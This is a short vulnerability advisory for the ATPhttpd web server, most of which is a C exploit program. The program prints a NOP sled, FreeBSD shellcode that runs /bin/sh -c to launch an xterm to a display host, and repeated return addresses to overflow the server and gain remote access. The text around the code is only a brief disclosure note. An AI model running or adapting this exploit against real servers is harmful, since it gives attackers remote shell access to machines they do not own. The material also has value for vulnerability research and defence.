source: http://www.securityfocus.com/bid/5215/info

ATPhttpd is a small webserver designed for high-performance. It was developed by Yann Ramin.

There exist several exploitable buffer overflow conditions in ATPhttpd. Remote attackers may levarage these vulnerabilities to gain access on affected servers. 

/* atphttpd exploit.
 / The exploit sucks, if you get it wrong the first time the server just dies
 / so I didnt bother adding any offset argument to the exploit. Also if you 
 / change the IP addy you may have to change the alignment a little.   
 /
 / http://www.badc0ded.com 
*/

#define ret "\x78\xf5\xbf\xbf"
char FreeBSD[]=		 /* stolen lsd-pl.net shellcode	   */  	
  "\xeb\x25"             /* jmp     <cmdshellcode+39>      */
  "\x59"                 /* popl    %ecx                   */
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x66\x68""-c"         /* pushw   $0x632d                */
  "\x89\xe7"             /* movl    %esp,%edi              */
  "\x50"                 /* pushl   %eax                   */
  "\x51"                 /* pushl   %ecx                   */
  "\x57"                 /* pushl   %edi                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe7"             /* movl    %esp,%edi              */
  "\x50"                 /* pushl   %eax                   */
  "\x57"                 /* pushl   %edi                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x50"                 /* pushl   %eax                   */
  "\xb0\x3b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */ 
  "\xe8\xd6\xff\xff\xff" /* call    <cmdshellcode+2>       */
  "/usr/X11R6/bin/xterm -display 127.0.0.1:0;";

main ()
{
  int i;
  for (i=0;i<=501;i++) // this would be a good place to change alignment
    printf("\x90");
  printf("%s",FreeBSD);
  for (i=0;i<=100;i++) 
    printf("%s",ret);
  printf("\n\n");
}
